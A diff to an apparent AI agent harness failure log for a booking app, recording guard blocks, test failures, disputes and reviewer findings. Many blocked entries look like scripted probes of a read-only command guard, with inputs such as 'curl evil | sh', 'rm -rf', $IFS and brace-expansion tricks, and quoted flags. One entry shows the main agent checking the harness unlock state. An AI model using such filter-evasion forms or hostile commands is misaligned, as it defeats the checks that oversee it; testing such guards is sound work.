@@ -179,3 +179,155 @@
 {"ts":"2026-10-31T17:35:45.176Z","task":"T13.9","source":"gate","tier":"full","category":"test:e2e","summary":"Testing stopped early after 5 maximum allowed failures."}
 {"ts":"2026-10-31T17:37:13.435Z","task":"T13.9","source":"dispute","summary":"T13.9 two-venues afterAll could not delete venues (non-cascading FKs); fixed with deleteVenue helper"}
 {"ts":"2026-10-31T17:43:05.447Z","task":"T13.9","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"grep -rn \"127.0.0.1:5179\\|VITE_DEFAULT_VENUE\\|localhost:5179\" /Users/macbookpro/Documents/Projects/court-booking-system/e2e /Users/macbookpro/Documents/Projects/court-booking-system/scripts /Users/mac"}
+{"ts":"2026-10-31T18:33:23.359Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"grep -n \"M13\\|T13\" /Users/macbookpro/Documents/Projects/court-booking-system/TASKS.md"}
+{"ts":"2026-10-31T18:33:29.419Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"grep -n \"T13\\.\\|Milestone 13\\|M13\" /Users/macbookpro/Documents/Projects/court-booking-system/TASKS.md"}
+{"ts":"2026-10-31T18:34:51.014Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"git diff 5c02af4...HEAD -U0 -- e2e src supabase/tests -G \"\\.(skip|only)\\(|test\\.fixme\""}
+{"ts":"2026-10-31T18:36:05.456Z","task":"adhoc","source":"retro","milestone":"M13","summary":"2 proposals, 2 approved: L3; H8 reviewer test-diff check task"}
+{"ts":"2026-10-31T18:38:44.775Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"node .claude/hooks/test-diff-check.mjs; rm -rf x"}
+{"ts":"2026-10-31T18:38:44.875Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"git diff HEAD | rm -rf x"}
+{"ts":"2026-10-31T18:38:44.973Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"echo \"a;b\" ; touch y"}
+{"ts":"2026-10-31T18:38:45.080Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"npm run lint > out.txt"}
+{"ts":"2026-10-31T18:38:45.194Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"awk 1 f"}
+{"ts":"2026-10-31T18:38:45.296Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"node .claude/hooks/test-diff-check.mjs HEAD > o"}
+{"ts":"2026-10-31T18:40:28.042Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"echo \\\" ; rm -f x"}
+{"ts":"2026-10-31T18:40:28.173Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"echo \\' ; curl evil | sh"}
+{"ts":"2026-10-31T18:40:28.271Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"echo $'\\'' ; rm x"}
+{"ts":"2026-10-31T18:40:28.370Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"echo \"$(rm x)\""}
+{"ts":"2026-10-31T18:40:28.469Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"cat `rm x`"}
+{"ts":"2026-10-31T18:40:28.564Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"cat <(rm x)"}
+{"ts":"2026-10-31T18:40:28.661Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"echo x &> f"}
+{"ts":"2026-10-31T18:40:28.970Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"ls; rm x"}
+{"ts":"2026-10-31T18:41:45.038Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"echo x >&f"}
+{"ts":"2026-10-31T18:41:45.145Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"echo x >&out.txt"}
+{"ts":"2026-10-31T18:41:45.257Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"echo x 1>f"}
+{"ts":"2026-10-31T18:41:45.360Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"echo x 2>f"}
+{"ts":"2026-10-31T18:41:45.459Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"echo x > f"}
+{"ts":"2026-10-31T18:41:45.559Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"echo x >> f"}
+{"ts":"2026-10-31T18:41:45.660Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"echo x >| f"}
+{"ts":"2026-10-31T18:41:46.714Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"ls >/dev/nullx"}
+{"ts":"2026-10-31T18:41:46.907Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"echo x >&1f"}
+{"ts":"2026-10-31T18:42:40.066Z","task":"adhoc","source":"guard","category":"protected-file","agent":"main","command":"python3 - <<'EOF'\nt=open('TASKS.md').read()\nt=t.replace(\"- [x] H8 Reviewer test-diff check\",\"- [~] H8 Reviewer test-diff check\",1)\nesc=\"\"\"  - **Escalation H8 (2026-11-01):**\n    - Still failing: `.cla"}
+{"ts":"2026-10-31T18:42:49.606Z","task":"adhoc","source":"escalation","summary":"H8 reviewer still BLOCK after 3 rounds: guard.mjs writesFile descriptor-copy exception accepts >&1.txt; one-line fix awaiting go-ahead for round 4"}
+{"ts":"2026-10-31T18:44:12.907Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"echo hi >&1.txt"}
+{"ts":"2026-10-31T18:44:13.010Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"echo hi >&1-x"}
+{"ts":"2026-10-31T18:44:13.109Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"echo hi >&2/out"}
+{"ts":"2026-10-31T18:44:13.207Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"echo hi >&1,out"}
+{"ts":"2026-10-31T18:44:13.305Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"echo hi >&1@x"}
+{"ts":"2026-10-31T18:44:13.403Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"ls 2>&1.txt"}
+{"ts":"2026-10-31T18:44:13.502Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"echo x >&1f"}
+{"ts":"2026-10-31T18:44:13.598Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"echo x >&f"}
+{"ts":"2026-10-31T18:44:13.696Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"echo x 2>f"}
+{"ts":"2026-10-31T18:44:13.794Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"echo x > f"}
+{"ts":"2026-10-31T18:44:14.556Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"ls >/dev/nullx"}
+{"ts":"2026-10-31T18:45:13.552Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"echo hi # it's\necho x > out.txt"}
+{"ts":"2026-10-31T18:45:13.655Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"cat <<E\necho it's\nE\necho x > out.txt"}
+{"ts":"2026-10-31T18:45:13.757Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"cat <<<x"}
+{"ts":"2026-10-31T18:45:13.988Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"echo x > f"}
+{"ts":"2026-10-31T18:45:14.088Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"echo hi >&1.txt"}
+{"ts":"2026-10-31T18:46:20.478Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"sed -n '1w /tmp/o' f"}
+{"ts":"2026-10-31T18:46:20.583Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"sed -n -e '1e id' f"}
+{"ts":"2026-10-31T18:46:20.685Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"sed -n '1,5w o' f"}
+{"ts":"2026-10-31T18:46:20.792Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"sed -n 1p f; sed -n 'r x' f"}
+{"ts":"2026-10-31T18:46:20.896Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"git diff --output=o"}
+{"ts":"2026-10-31T18:46:20.996Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"git log --output o"}
+{"ts":"2026-10-31T18:46:21.095Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"sort -o o f"}
+{"ts":"2026-10-31T18:46:21.193Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"sort --output=o f"}
+{"ts":"2026-10-31T18:46:21.291Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"sort -ro o f"}
+{"ts":"2026-10-31T18:46:21.390Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"uniq in out"}
+{"ts":"2026-10-31T18:46:21.489Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"find . -fprint o"}
+{"ts":"2026-10-31T18:46:21.586Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"find . -fls o"}
+{"ts":"2026-10-31T18:46:21.694Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"rg --pre ls x"}
+{"ts":"2026-10-31T18:47:46.593Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"sort -oOUT f"}
+{"ts":"2026-10-31T18:47:46.691Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"sort --out=OUT f"}
+{"ts":"2026-10-31T18:47:46.792Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"sort -S 1 --compress-program=sh f"}
+{"ts":"2026-10-31T18:47:46.889Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"sort -T /tmp f"}
+{"ts":"2026-10-31T18:47:46.988Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"uniq - OUT"}
+{"ts":"2026-10-31T18:47:47.089Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"uniq -c - OUT"}
+{"ts":"2026-10-31T18:47:47.189Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"uniq in out"}
+{"ts":"2026-10-31T18:47:47.287Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"npm run lint -- --fix"}
+{"ts":"2026-10-31T18:47:47.386Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"npm run test -- -u"}
+{"ts":"2026-10-31T18:47:47.487Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"npx vitest run -u"}
+{"ts":"2026-10-31T18:47:47.602Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"npx vitest run --outputFile=x"}
+{"ts":"2026-10-31T18:47:47.701Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"npx vitest run --coverage"}
+{"ts":"2026-10-31T18:47:47.800Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"file -C -m x"}
+{"ts":"2026-10-31T18:47:47.898Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"file --compile"}
+{"ts":"2026-10-31T18:47:47.997Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"file -m x f"}
+{"ts":"2026-10-31T18:47:48.101Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"sed -n '1w o' f"}
+{"ts":"2026-10-31T18:47:48.198Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"git diff --output=o"}
+{"ts":"2026-10-31T18:47:48.297Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"find . -fls o"}
+{"ts":"2026-10-31T18:47:48.487Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"rg --pre ls x"}
+{"ts":"2026-10-31T18:49:36.578Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"sort \"-o\"out f"}
+{"ts":"2026-10-31T18:49:36.677Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"sort \\-o out f"}
+{"ts":"2026-10-31T18:49:36.774Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"sort \"--compress-program=sh\" -S 1 big"}
+{"ts":"2026-10-31T18:49:36.872Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"file \"-C\" -m NAME"}
+{"ts":"2026-10-31T18:49:36.969Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"npx vitest run \"-u\""}
+{"ts":"2026-10-31T18:49:37.066Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"npx vitest run \"--outputFile=x\""}
+{"ts":"2026-10-31T18:49:37.164Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"sed -n 1p \"-i\" file"}
+{"ts":"2026-10-31T18:49:37.263Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"rg \"--pre=sh\" x"}
+{"ts":"2026-10-31T18:49:37.360Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"rg '--pre' sh pat"}
+{"ts":"2026-10-31T18:49:37.457Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"git diff \"--output=x\""}
+{"ts":"2026-10-31T18:49:37.555Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"find . \"-fprint\" x"}
+{"ts":"2026-10-31T18:49:37.651Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"find . \"-fls\" x"}
+{"ts":"2026-10-31T18:49:37.750Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"sort${IFS}-oout${IFS}file"}
+{"ts":"2026-10-31T18:49:37.847Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"rg${IFS}--pre=sh${IFS}x"}
+{"ts":"2026-10-31T18:49:37.947Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"uniq${IFS}in${IFS}out"}
+{"ts":"2026-10-31T18:49:38.045Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"sort $IFS -o x"}
+{"ts":"2026-10-31T18:49:38.148Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"git diff-tree HEAD"}
+{"ts":"2026-10-31T18:49:38.265Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"cat-x f"}
+{"ts":"2026-10-31T18:50:49.141Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"find . -name x -d\"elete\""}
+{"ts":"2026-10-31T18:50:49.251Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"find . -\\delete"}
+{"ts":"2026-10-31T18:50:49.350Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"find . -exe\"c\" rm x"}
+{"ts":"2026-10-31T18:50:49.448Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"find . -ex\\ec rm x"}
+{"ts":"2026-10-31T18:50:49.546Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"find . -delete"}
+{"ts":"2026-10-31T18:50:49.644Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"find . -exec rm {} +"}
+{"ts":"2026-10-31T18:50:49.744Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"find . -okdir x"}
+{"ts":"2026-10-31T18:50:49.841Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"find . -d{elete,}"}
+{"ts":"2026-10-31T18:50:49.938Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"find . -f{print,} out"}
+{"ts":"2026-10-31T18:50:50.053Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"git diff --out{put,}=x"}
+{"ts":"2026-10-31T18:50:50.152Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"rg --p{re,}=sh x"}
+{"ts":"2026-10-31T18:50:50.251Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"sed -n 1p {-i,} file"}
+{"ts":"2026-10-31T18:50:50.348Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"sort {-o,} out f"}
+{"ts":"2026-10-31T18:50:50.447Z","task":"adhoc","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"echo {a,b}"}
+{"ts":"2026-10-31T19:58:41.204Z","task":"T14.5b","source":"guard","category":"commit-before-full-verify","agent":"main","command":"node .claude/hooks/verify-gate.mjs --full 2>&1 | tail -n 2 && git add SPEC.md TASKS.md package.json scripts src supabase && git commit -q -m \"feat(console): T14.5 invite-venue-owner function\n\nCo-Autho"}
+{"ts":"2026-11-01T02:42:36.382Z","task":"T14.5b","source":"gate","tier":"full","category":"test","summary":"❯ src/features/admin/SetPasswordPrompt.test.tsx (6 tests | 1 failed) 629ms"}
+{"ts":"2026-11-01T02:48:03.820Z","task":"T14.5b","source":"gate","tier":"fast","category":"test","summary":"❯ src/features/admin/SetPasswordPrompt.test.tsx (6 tests | 1 failed) 1196ms"}
+{"ts":"2026-11-01T02:48:18.593Z","task":"T14.5b","source":"dispute","file":"src/features/admin/SetPasswordPrompt.test.tsx","summary":"beforeEach returned the mock, run by Vitest as teardown, calling the rejecting mock","outcome":"test fixed"}
+{"ts":"2026-11-01T02:54:03.885Z","task":"T14.5b","source":"reviewer","severity":"blocker","category":"missing-test","file":"src/features/admin/SetPasswordPrompt.test.tsx:beforeEach","summary":"beforeEach returned the mock, so Vitest ran it as teardown and failed the failure-path test (test fixed)","round":1}
+{"ts":"2026-11-01T03:19:45.303Z","task":"T14.7","source":"dispute","file":"supabase/tests/database/58_publish_venue.test.sql","summary":"status read as another venues admin was NULL due to RLS; read as postgres","outcome":"test fixed"}
+{"ts":"2026-11-01T03:20:22.429Z","task":"T14.7","source":"gate","tier":"fast","category":"test","summary":"❯ src/features/admin/DashboardPage.test.tsx (2 tests | 2 failed) 57ms"}
+{"ts":"2026-11-01T03:27:25.146Z","task":"T14.8","source":"guard","category":"commit-before-full-verify","agent":"main","command":"git commit -q -m \"feat(console): T14.7 setup checklist and publish_venue\n\nCo-Authored-By: Claude Sonnet 5.5 <noreply@anthropic.com>\" 2>&1 | tail -5; git log --oneline -1"}
+{"ts":"2026-11-01T03:27:28.219Z","task":"T14.8","source":"guard","category":"commit-before-full-verify","agent":"main","command":"node .claude/hooks/verify-gate.mjs --full 2>&1 | tail -n 8 && git add -A TASKS.md SPEC.md .claude/retro/failures.jsonl src supabase && git commit -q -m \"feat(console): T14.7 setup checklist and publis"}
+{"ts":"2026-11-01T03:45:07.130Z","task":"T14.8","source":"gate","tier":"full","category":"test:db","summary":"# Failed test 26: \"another venue's charges and invoices are counted for that venue only\""}
+{"ts":"2026-11-01T03:45:19.879Z","task":"T14.8","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"node /Users/macbookpro/Documents/Projects/court-booking-system/.claude/hooks/test-diff-check.mjs"}
+{"ts":"2026-11-01T03:45:20.005Z","task":"T14.8","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"git -C /Users/macbookpro/Documents/Projects/court-booking-system diff HEAD -- src/features/console/api.ts src/features/console/hooks.ts src/features/console/ConsolePage.tsx supabase/tests/database/51_"}
+{"ts":"2026-11-01T03:45:35.035Z","task":"T14.8","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"npm run test:db 2>&1 | tail -15"}
+{"ts":"2026-11-01T03:46:41.203Z","task":"T14.8","source":"dispute","file":"supabase/tests/database/59_venues_overview.test.sql","summary":"test 26 compared text 1|20.00|1 to 1|20|1, depending on numeric scale","outcome":"test fixed"}
+{"ts":"2026-11-01T03:52:45.878Z","task":"T14.8","source":"reviewer","severity":"major","category":"acceptance-unmet","file":"supabase/migrations/20261101034239_venues_overview.sql:18","summary":"no PayMongo status in the venues list (recorded as deliberate in SPEC 10)","round":1}
+{"ts":"2026-11-01T03:52:45.953Z","task":"T14.8","source":"reviewer","severity":"major","category":"docs-drift","file":"SPEC.md","summary":"no section 6 rows or section 10 line for the new RPCs (fixed)","round":1}
+{"ts":"2026-11-01T03:52:48.444Z","task":"T14.8","source":"reviewer","severity":"blocker","category":"missing-test","file":"supabase/tests/database/59_venues_overview.test.sql:122","summary":"test 26 depends on numeric scale (upheld, fixed)","round":1}
+{"ts":"2026-11-01T04:51:32.985Z","task":"T14.9","source":"reviewer","severity":"blocker","category":"missing-test","file":"supabase/tests/database/60_monthly_invoices.test.sql:78","summary":"count(*) in same statement as volatile call cannot see new rows","round":1}
+{"ts":"2026-11-01T04:51:50.440Z","task":"T14.9","source":"dispute","file":"supabase/tests/database/60_monthly_invoices.test.sql","summary":"count(*) in same statement as volatile generate_invoices() read the statement snapshot (32 vs 0); split into separate statements","outcome":"test fixed"}
+{"ts":"2026-11-01T05:00:58.162Z","task":"T14.10","source":"gate","tier":"fast","category":"typecheck","summary":"src/features/console/api.invoices.test.ts(7,9): error TS2339: Property 'fetchInvoicesOverview' does not exist on type 'typeof import(\"/Users/macbookpro/Documents/Projects/court-booking-system/src/features/console/api\")'."}
+{"ts":"2026-11-01T05:01:14.342Z","task":"T14.10","source":"gate","tier":"fast","category":"typecheck","summary":"src/features/console/api.invoices.test.ts(7,9): error TS2339: Property 'fetchInvoicesOverview' does not exist on type 'typeof import(\"/Users/macbookpro/Documents/Projects/court-booking-system/src/features/console/api\")'."}
+{"ts":"2026-11-01T05:01:32.251Z","task":"T14.10","source":"gate","tier":"fast","category":"typecheck","summary":"src/features/console/api.invoices.test.ts(7,9): error TS2339: Property 'fetchInvoicesOverview' does not exist on type 'typeof import(\"/Users/macbookpro/Documents/Projects/court-booking-system/src/features/console/api\")'."}
+{"ts":"2026-11-01T05:03:19.896Z","task":"T14.10","source":"gate","tier":"full","category":"lint","summary":"8:17  error  Fast refresh only works when a file only exports components. Use a new file to share constants or functions between components  react-refresh/only-export-components"}
+{"ts":"2026-11-01T05:10:07.467Z","task":"T14.10","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"git -C /Users/macbookpro/Documents/Projects/court-booking-system diff HEAD -- SPEC.md supabase/tests/database/51_cross_venue_isolation.test.sql src/features/console/api.ts src/features/console/hooks.t"}
+{"ts":"2026-11-01T05:10:07.555Z","task":"T14.10","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"node /Users/macbookpro/Documents/Projects/court-booking-system/.claude/hooks/test-diff-check.mjs"}
+{"ts":"2026-11-01T05:27:38.563Z","task":"T14.11","source":"gate","tier":"fast","category":"typecheck","summary":"src/features/admin/api.ts(644,36): error TS2345: Argument of type '\"venue_statement\"' is not assignable to parameter of type '\"cancel_booking\" | \"claim_email_outbox\" | \"claim_guest_bookings\" | \"claim_guest_link_email\" | \"create_booking\" | \""}
+{"ts":"2026-11-01T05:28:14.564Z","task":"T14.11","source":"dispute","summary":"T14.11 62_venue_statement test 12: unescaped apostrophe, fixed by test-writer"}
+{"ts":"2026-11-01T05:28:22.397Z","task":"T14.11","source":"gate","tier":"fast","category":"typecheck","summary":"src/features/admin/api.ts(644,36): error TS2345: Argument of type '\"venue_statement\"' is not assignable to parameter of type '\"cancel_booking\" | \"claim_email_outbox\" | \"claim_guest_bookings\" | \"claim_guest_link_email\" | \"create_booking\" | \""}
+{"ts":"2026-11-01T05:30:15.292Z","task":"T14.11","source":"gate","tier":"full","category":"test","summary":"❯ src/features/admin/StatementPage.test.tsx (7 tests | 2 failed) 2351ms"}
+{"ts":"2026-11-01T05:30:17.353Z","task":"T14.11","source":"gate","tier":"fast","category":"test","summary":"❯ src/features/admin/StatementPage.test.tsx (7 tests | 2 failed) 2356ms"}
+{"ts":"2026-11-01T08:29:27.239Z","task":"T14.13","source":"gate","tier":"fast","category":"typecheck","summary":"src/features/admin/SettingsPage.tsx(40,28): error TS2739: Type '{ address: string; banner_alt: string | null; banner_path: string | null; booking_window_days: number; cancel_cutoff_hours: number; currency: string; maps_url: string; max_reje"}
+{"ts":"2026-11-01T08:49:21.067Z","task":"T14.14","source":"gate","tier":"full","category":"test:e2e","summary":"Testing stopped early after 5 maximum allowed failures."}
+{"ts":"2026-11-01T08:59:24.368Z","task":"adhoc","source":"retro","milestone":"M14","summary":"3 proposals, 2 approved: H10 beforeEach mock-return check, H11 reviewer allowlist; L3 extension declined"}
+{"ts":"2026-11-01T09:07:48.773Z","task":"T15.2","source":"guard","category":"protected-file","agent":"main","command":"grep -n \"harnessUnlocked\" -A8 .claude/hooks/lib/harness.mjs | head -20; ls -l --time-style=full-iso .claude/state/unlock-harness 2>/dev/null || stat -f \"%Sm\" .claude/state/unlock-harness; date; cat .c"}
+{"ts":"2026-11-01T09:08:15.483Z","task":"T15.2","source":"guard","category":"protected-file","agent":"main","command":"S=/private/tmp/claude-501/-Users-macbookpro-Documents-Projects-court-booking-system/c24bf5db-322b-437e-bf0d-0aaeafc0efb7/scratchpad/h11check && rm -rf \"$S\" && mkdir -p \"$S/.claude/retro\" \"$S/.claude/s"}
+{"ts":"2026-11-01T09:47:23.725Z","task":"T15.3","source":"dispute","file":"supabase/functions/_shared/leadAlert.test.ts","summary":"indexOf(sendLeadAlert) matched the import line, so ordering check could never pass","outcome":"test fixed"}
+{"ts":"2026-11-01T09:47:37.427Z","task":"T15.3","source":"gate","tier":"fast","category":"lint","summary":"22:36  error  '_url' is defined but never used   @typescript-eslint/no-unused-vars"}
+{"ts":"2026-11-01T09:48:07.856Z","task":"T15.3","source":"guard","category":"locked-test","agent":"main","command":"for i in $(seq 1 20); do npx eslint supabase/functions/_shared/leadAlert.test.ts >/dev/null 2>&1 && echo clean && break; sleep 5; done; npx eslint supabase/functions/_shared/leadAlert.test.ts 2>&1 | t"}
+{"ts":"2026-11-01T10:03:00.253Z","task":"T15.4","source":"dispute","file":"supabase/tests/database/65_reviews.test.sql","summary":"plan(27) but file asserts 26 (platform admin block has 6 tests, not 7)","outcome":"test fixed"}
+{"ts":"2026-11-01T10:33:34.343Z","task":"T15.6","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"cmp supabase/functions/_shared/siteForms.ts ../plotline-site/src/lib/siteForms.ts"}
+{"ts":"2026-11-01T10:33:34.422Z","task":"T15.6","source":"guard","category":"reviewer-readonly","agent":"reviewer","command":"npm run check:drift"}
+{"ts":"2026-11-01T12:45:30.089Z","task":"T15.6","source":"reviewer","severity":"major","category":"docs-drift","file":"SPEC.md:420","summary":"M15 not marked done in SPEC §9","round":1}
+{"ts":"2026-11-01T12:54:05.261Z","task":"adhoc","source":"retro","milestone":"M15","summary":"0 proposals, none approved: 9 events, no repeated pattern"}
